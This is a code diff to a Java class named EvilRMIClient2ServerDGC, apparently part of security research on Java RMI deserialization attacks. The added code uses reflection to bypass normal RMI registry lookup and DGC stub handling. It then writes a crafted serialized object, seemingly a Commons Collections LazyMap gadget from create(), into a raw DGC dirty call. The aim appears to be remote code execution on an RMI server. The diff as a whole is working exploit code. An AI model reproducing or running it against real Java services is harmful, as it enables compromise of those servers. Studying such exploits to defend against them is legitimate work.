@@ -8,6 +8,7 @@ import org.apache.commons.collections.map.LazyMap;
 import org.trganda.remote.RemoteService;
 import sun.rmi.server.UnicastRef;
 import sun.rmi.transport.DGCImpl_Stub;
+import sun.rmi.transport.LiveRef;
 import sun.rmi.transport.StreamRemoteCall;
 import sun.rmi.transport.TransportConstants;
 
@@ -22,10 +23,7 @@ import java.rmi.NotBoundException;
 import java.rmi.RemoteException;
 import java.rmi.registry.LocateRegistry;
 import java.rmi.registry.Registry;
-import java.rmi.server.Operation;
-import java.rmi.server.RemoteCall;
-import java.rmi.server.RemoteObject;
-import java.rmi.server.RemoteRef;
+import java.rmi.server.*;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -60,11 +58,40 @@ public class EvilRMIClient2ServerDGC {
         return anotherHandler;
     }
 
+    public RemoteService getRemoteService(String name) throws RemoteException {
+        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9099);
+        try {
+            Field ref = registry.getClass().getSuperclass().getSuperclass().getDeclaredField("ref");
+            Field operations = registry.getClass().getDeclaredField("operations");
+            Field interfaceHash = registry.getClass().getDeclaredField("interfaceHash");
+
+            ref.setAccessible(true);
+            operations.setAccessible(true);
+            interfaceHash.setAccessible(true);
+            RemoteRef refs = (RemoteRef) ref.get(registry);
+
+            Method newCall = refs.getClass().getDeclaredMethod("newCall", RemoteObject.class, Operation[].class, int.class, long.class);
+            Method invoke = refs.getClass().getDeclaredMethod("invoke", RemoteCall.class);
+
+            StreamRemoteCall call = (StreamRemoteCall)newCall.invoke(refs, registry, operations.get(registry), 2, interfaceHash.get(registry));
+            ObjectOutput out = call.getOutputStream();
+            out.writeObject(name);
+
+            invoke.invoke(refs, call);
+
+            return (RemoteService) call.getInputStream().readObject();
+
+        } catch (Exception ex) {
+            ex.printStackTrace();
+        }
+        return null;
+    }
+
     public void callRemote(String name) throws RemoteException, NotBoundException {
         Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9099);
-        RemoteService rs = (RemoteService) registry.lookup(name);
 
         try {
+            RemoteService rs = getRemoteService(name);
             Field h = rs.getClass().getSuperclass().getDeclaredField("h");
             h.setAccessible(true);
             InvocationHandler handler = (InvocationHandler) h.get(rs);
@@ -77,6 +104,30 @@ public class EvilRMIClient2ServerDGC {
             Constructor dgcC = dgcStub.getConstructor(RemoteRef.class);
             DGCImpl_Stub stub = (DGCImpl_Stub) dgcC.newInstance(unicastRef);
 
+            Field operations = stub.getClass().getDeclaredField("operations");
+            Field interfaceHash = stub.getClass().getDeclaredField("interfaceHash");
+
+            operations.setAccessible(true);
+            interfaceHash.setAccessible(true);
+
+            RemoteCall call = stub.getRef().newCall((RemoteObject) stub, (Operation[]) operations.get(stub), 1, (Long) interfaceHash.get(stub));
+            Field liveRef = stub.getRef().getClass().getDeclaredField("ref");
+            liveRef.setAccessible(true);
+            LiveRef liveRefs = (LiveRef) liveRef.get(stub.getRef());
+            Field id = liveRefs.getClass().getDeclaredField("id");
+            id.setAccessible(true);
+            ObjID objID = (ObjID) id.get(liveRefs);
+
+            ObjectOutput out = call.getOutputStream();
+
+            ObjID[] objIDs = new ObjID[] { new ObjID(2) };
+
+            new ObjID(2).write(out);
+            out.writeObject(objIDs);
+            out.writeLong(1);
+            out.writeObject(create());
+
+            stub.getRef().invoke(call);
         } catch (Exception ex) {
             ex.printStackTrace();
         }
